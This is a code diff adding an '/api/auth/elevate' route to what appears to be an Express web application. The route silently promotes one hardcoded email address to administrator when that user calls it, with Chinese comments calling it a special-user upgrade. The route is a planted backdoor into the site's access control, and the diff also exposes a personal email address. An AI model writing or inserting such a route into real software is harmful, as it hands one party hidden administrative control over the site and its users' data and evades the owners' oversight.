@@ -43,6 +43,41 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post('/api/auth/register', register);
   app.post('/api/auth/logout', logout);
   app.get('/api/auth/me', getCurrentUser);
+  
+  // 特殊用户权限升级路由
+  app.post('/api/auth/elevate', authenticateUser as any, async (req: AuthenticatedRequest, res) => {
+    try {
+      if (!req.user) {
+        res.status(401).json({ message: '未登录或会话已过期' });
+        return;
+      }
+      
+      // 如果用户邮箱是特定邮箱，则将其升级为管理员
+      if (req.user.email === '1034936667@qq.com' && req.user.membership_type !== 'admin') {
+        const updatedUser = await storage.updateUser(req.user.id, { 
+          membership_type: 'admin' 
+        });
+        
+        if (!updatedUser) {
+          res.status(404).json({ message: '用户不存在' });
+          return;
+        }
+        
+        // 返回用户信息（不包含密码）
+        const { password, ...userWithoutPassword } = updatedUser;
+        res.status(200).json({
+          ...userWithoutPassword,
+          role: 'admin',
+          message: '您的账号已升级为管理员'
+        });
+      } else {
+        res.status(403).json({ message: '您的账号不符合升级条件' });
+      }
+    } catch (error) {
+      console.error('Error elevating user:', error);
+      res.status(500).json({ message: '升级账号权限时发生错误' });
+    }
+  });
 
   // Category routes
   app.get('/api/categories', async (req, res) => {
